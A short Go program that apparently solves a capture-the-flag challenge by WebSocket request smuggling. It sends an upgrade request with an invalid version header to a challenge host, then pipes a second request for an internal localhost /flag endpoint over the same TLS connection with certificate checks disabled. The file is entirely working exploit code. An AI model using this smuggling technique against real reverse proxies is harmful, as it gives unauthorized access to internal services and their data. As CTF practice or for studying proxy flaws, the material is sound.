package main

import (
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
)

func main() {
	conn, err := tls.Dial("tcp", "challenge.0ang3el.tk:443", &tls.Config{InsecureSkipVerify: true})
	if err != nil {
		fmt.Println(err)
		return
	}
	defer conn.Close()

	challengeKey, _ := generateChallengeKey()
	req, _ := http.NewRequest("GET", "wss://challenge.0ang3el.tk/socket.io/?EIO=3&transport=websocket", nil)
	req.Header["Upgrade"] = []string{"websocket"}
	req.Header["Connection"] = []string{"Upgrade"}
	req.Header["Sec-WebSocket-Key"] = []string{challengeKey}
	req.Header["Sec-WebSocket-Version"] = []string{"1337"}

	state := conn.ConnectionState()
	fmt.Println("SSL ServerName : " + state.ServerName)
	fmt.Println("SSL Handshake : ", state.HandshakeComplete)
	fmt.Println("SSL Mutual : ", state.NegotiatedProtocolIsMutual)
	fmt.Println()

	req.Write(os.Stdout)

	//_, err = conn.Write([]byte(wsscontent))
	err = req.Write(conn)
	if err != nil {
		fmt.Println("write fail", err)
		return
	}

	buff := make([]byte, 1024*20)
	size, err := conn.Read(buff)
	if err != nil {
		fmt.Println("read fail", err)
		return
	}
	fmt.Println(string(buff[:size]))

	req2, _ := http.NewRequest("GET", "http://localhost:5000/flag", nil)

	req2.Write(os.Stdout)

	err = req2.Write(conn)
	if err != nil {
		fmt.Println("write2 fail", err)
		return
	}

	size, err = conn.Read(buff)
	if err != nil {
		fmt.Println("read fail", err)
		return
	}
	fmt.Println(string(buff[:size]))
}

func generateChallengeKey() (string, error) {
	p := make([]byte, 16)
	if _, err := io.ReadFull(rand.Reader, p); err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(p), nil
}
